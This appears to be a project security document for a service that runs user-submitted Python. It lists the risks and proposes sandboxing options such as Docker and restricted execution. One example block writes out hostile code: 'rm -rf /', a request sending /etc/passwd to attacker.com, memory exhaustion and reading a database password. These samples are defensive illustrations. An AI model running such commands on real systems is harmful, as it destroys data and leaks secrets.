# Code Execution Security

## ⚠️ Current Security Status: NOT PRODUCTION READY

The current implementation runs user-submitted Python code directly on the server, which poses **serious security risks**.

## Security Risks

### Current Vulnerabilities

1. **File System Access**
   - Can read/write/delete files on the server
   - Can access sensitive configuration files
   - Can modify application code

2. **Network Access**
   - Can make HTTP requests to external servers
   - Can be used for DDoS attacks
   - Can exfiltrate data

3. **System Commands**
   - Can execute shell commands via `os.system()`, `subprocess`, etc.
   - Can install packages, modify system settings
   - Can access environment variables with secrets

4. **Resource Exhaustion**
   - No memory limits (can crash server)
   - No CPU limits (can consume all CPU)
   - Can create infinite loops (only timeout protection)

5. **Module Imports**
   - Can import dangerous modules (`shutil`, `subprocess`, `socket`, etc.)
   - Can access system libraries

6. **Privilege Escalation**
   - Runs with server user privileges
   - Can potentially escalate to root if server runs as root

## Example Malicious Code

```python
# Delete files
import os
os.system("rm -rf /")

# Exfiltrate data
import requests
requests.post("http://attacker.com", data=open("/etc/passwd").read())

# Resource exhaustion
while True:
    [0] * 1000000000  # Memory exhaustion

# Access secrets
import os
print(os.environ.get("DATABASE_PASSWORD"))
```

## Recommended Solutions

### Option 1: Docker Containers (Recommended for Production)

**Pros:**
- Complete isolation
- Resource limits (CPU, memory, disk)
- Network restrictions
- File system isolation
- Easy to scale

**Cons:**
- Requires Docker
- Slightly slower (container startup)
- More complex setup

**Implementation:**
```python
# Use docker-py to run code in isolated containers
import docker

client = docker.from_env()
container = client.containers.run(
    "python:3.9-slim",
    command=["python", "/code/solution.py"],
    mem_limit="128m",
    cpu_period=100000,
    cpu_quota=50000,  # 50% CPU
    network_disabled=True,
    volumes={code_path: {"bind": "/code", "mode": "ro"}},
    remove=True,
    timeout=10
)
```

### Option 2: Restricted Python (PyPy Sandbox)

**Pros:**
- No Docker required
- Fast execution
- Built-in restrictions

**Cons:**
- PyPy-specific (not CPython)
- Less flexible
- Still some risks

### Option 3: Restricted Execution Environment

**Pros:**
- No external dependencies
- Works with current setup

**Cons:**
- Less secure than Docker
- Requires careful configuration

**Implementation:**
- Use `restrictedpython` or similar
- Block dangerous imports
- Use resource limits (ulimit)
- Run as unprivileged user

### Option 4: External Code Execution Service

**Pros:**
- Isolates risk from main server
- Can use specialized services (Judge0, Piston, etc.)
- Professional security

**Cons:**
- Additional service to manage
- May have costs
- Network dependency

**Services:**
- **Judge0 API** - Open source code execution API
- **Piston** - Fast code execution engine
- **CodeX Execution API** - Cloud-based solution

## Immediate Security Improvements

Even before implementing full sandboxing, we can add:

1. **Block Dangerous Imports**
2. **Resource Limits** (ulimit)
3. **Run as Unprivileged User**
4. **Network Restrictions**
5. **File System Restrictions**
6. **Code Analysis** (AST parsing to detect dangerous patterns)

## Implementation Priority

### Phase 1: Quick Wins (Do Now)
- [ ] Block dangerous imports (`os`, `subprocess`, `socket`, etc.)
- [ ] Run as unprivileged user
- [ ] Add resource limits (ulimit)
- [ ] Restrict file system access
- [ ] Add code analysis to detect dangerous patterns

### Phase 2: Better Security (Next)
- [ ] Implement Docker-based execution
- [ ] Add network restrictions
- [ ] Implement rate limiting per user
- [ ] Add monitoring and logging

### Phase 3: Production Ready
- [ ] Full Docker isolation
- [ ] Resource quotas per user
- [ ] Monitoring and alerting
- [ ] Security audits

## Current Mitigations

✅ **What we have:**
- Timeout protection (10 seconds)
- Subprocess isolation (somewhat)
- Temporary file cleanup

❌ **What we're missing:**
- Resource limits (CPU, memory)
- Network restrictions
- File system restrictions
- Import restrictions
- User privilege restrictions
- Code analysis

## Recommendation

**For Development/Testing:** Current implementation is acceptable with added restrictions.

**For Production:** Must implement Docker-based execution or use external service.

